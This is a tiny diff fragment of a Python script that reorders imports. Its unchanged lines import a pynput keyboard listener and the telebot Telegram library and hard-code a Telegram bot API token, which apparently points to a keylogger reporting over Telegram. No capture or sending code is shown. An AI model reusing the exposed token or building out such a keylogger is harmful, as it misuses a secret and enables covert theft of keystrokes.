@@ -1,7 +1,7 @@
 import os
-import telebot
 import time
 import threading
+import telebot
 from pynput.keyboard import Key, Listener
 
 API_TOKEN = '6071630449:AAHslhDKXn83m8gsfsB8m4_hQvw9-9N5pWE'
